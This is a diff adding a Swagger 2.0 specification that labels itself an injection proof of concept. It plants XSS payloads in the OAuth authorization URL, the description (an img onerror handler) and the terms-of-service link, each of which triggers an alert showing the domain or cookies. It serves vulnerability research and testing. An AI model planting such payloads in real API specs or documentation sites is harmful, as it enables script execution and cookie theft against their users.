@@ -1,0 +1,16 @@
+swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(document.domain)//
+info:
+  version: "0.0.1"
+  title: Resource Injection POC
+  description: <h1>Iframe Injection</h1><img src="https://variety.com/wp-content/uploads/2021/07/Rick-Astley-Never-Gonna-Give-You-Up.png?w=2048" onerror=alert(1)>
+  termsOfService: "javascript:alert(document.cookie)"
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
